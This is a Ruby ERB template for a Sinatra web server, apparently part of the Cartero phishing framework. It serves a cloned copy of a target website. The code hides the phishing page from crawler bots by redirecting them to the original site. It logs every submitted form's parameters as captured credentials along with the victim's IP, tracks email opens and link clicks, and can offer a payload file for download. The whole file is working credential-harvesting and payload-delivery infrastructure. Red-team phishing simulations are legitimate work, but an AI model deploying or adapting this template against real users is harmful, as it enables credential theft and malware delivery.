# encoding: UTF-8
<% if self[:reverse_proxy] %>
require 'rack/reverse_proxy'
<% end %>

class <%= self[:webserver].camelize %> < Sinatra::Base
	helpers Sinatra::Cookies
	helpers Cartero::SinatraHelpers
	register Cartero::CrawlerBlock

	# Block and Redirect Cartero Crawler Blocker
	# This method is used to redirect to the original site cloned when we
	# detect it is a crawler bot.
	block_and_redirect("<%=self[:url] %>")

	# Reverse Proxy Parameters:
	# This is an automated generated list based on the src/href  reacheable
	# by our script parser. Some might not be correctly reached and/or other
	# could not be correctly added.
	# reverse_proxy /RexExp/, "url/$1"<% if self[:reverse_proxy] %>
	use Rack::ReverseProxy do <% self[:reverse_proxy].each do |proxy| %>
		reverse_proxy /^<%= proxy[0] %>\/?(.*)$/, '<%= proxy[1] %>/$1'<% end %>
	end
	<% end %>
	<% if self[:payload] %>
		set :payload_path,	self[:payload]
	<% end %>
	not_found do
		$stdout.puts "#{Time.now} - IP #{request.ip} PORT #{request.port} - PATH #{request.path} - #{request.forwarded?} - #{request.user_agent}"
		redirect to "/"
	end

	get "/image" do
		process_info(params,request)
		return_img
	end

  get "/click" do
  	process_info(params,request)
		redirect to params[:url] || "<%= self[:url] %>"
	end

	<% if self[:payload] %>

	get "/download" do
		process_info(params, request)
		return_payload
	end

	<% end %>

	get "/" do
		process_info(params,request)
		erb :index
	end

	<% if self[:url_route] != "/" && self[:url_route] != "" %>

	get "<%= self[:url_route] %>" do
		process_info(params,request)
		erb :index
	end

	<% end %>

	<% self[:forms_routes].each do |route| %>
	<%= route[0] %> "<%=route[1]%>" do
		$stdout.puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
		process_info(params,request)
		process_cred(params,request)

		redirect to "<%= self[:url] %>"
	end
	<% end %>

end
